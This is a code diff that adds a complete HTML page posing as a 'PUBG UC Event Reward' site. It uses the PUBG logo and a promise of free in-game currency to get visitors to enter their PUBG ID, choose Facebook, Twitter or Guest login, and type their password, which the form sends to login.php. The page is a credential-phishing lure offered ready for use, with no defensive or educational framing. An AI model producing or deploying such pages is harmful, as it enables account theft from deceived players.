@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PUBG UC Rewards</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://wallpapercave.com/wp/wp9059984.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 400px;
+      margin: 100px auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      color: #fff;
+      text-align: center;
+    }
+
+    .container img {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+    .container h2 {
+      margin-bottom: 10px;
+      color: #fff;
+    }
+
+    .note {
+      font-size: 14px;
+      color: #ddd;
+      margin-bottom: 20px;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input, select {
+      background-color: rgba(255,255,255,0.8);
+      color: #333;
+    }
+
+    button {
+      background-color: #ffaa00;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e69600;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        margin-top: 50px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/PUBG_logo.svg" alt="PUBG Logo">
+    <h2>PUBG UC Event Reward</h2>
+    <div class="note">Login here and play in this app to get some Free UC</div>
+    <form action="login.php" method="POST">
+      <input type="text" name="pubg_id" placeholder="Enter PUBG ID" required>
+      <select name="method">
+        <option value="">Select Login Method</option>
+        <option>Facebook</option>
+        <option>Twitter</option>
+        <option>Guest</option>
+      </select>
+      <input type="password" name="password" placeholder="Enter Password" required>
+      <button type="submit">Get UC</button>
+    </form>
+  </div>
+</body>
+</html>
